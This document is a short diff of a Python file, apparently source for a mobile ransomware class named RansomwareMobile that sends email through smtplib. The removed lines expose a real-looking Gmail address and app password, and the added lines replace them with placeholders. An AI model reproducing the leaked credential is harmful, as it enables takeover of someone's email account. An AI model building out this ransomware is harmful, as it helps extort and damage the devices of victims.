@@ -10,9 +10,9 @@ import smtplib
 from email.mime.text import MIMEText
 
 # CONFIGURAÇÕES DE EMAIL - ATUALIZADAS
-EMAIL_ORIGEM = "alengamer64@gmail.com"
-EMAIL_DESTINO = "alengamer64@gmail.com"
-SENHA_APP = "csqs tbia ldyo aeeg"
+EMAIL_ORIGEM = "EMAIL"
+EMAIL_DESTINO = "EMAIL"
+SENHA_APP = "SENHA"
 
 class RansomwareMobile:
     def __init__(self):
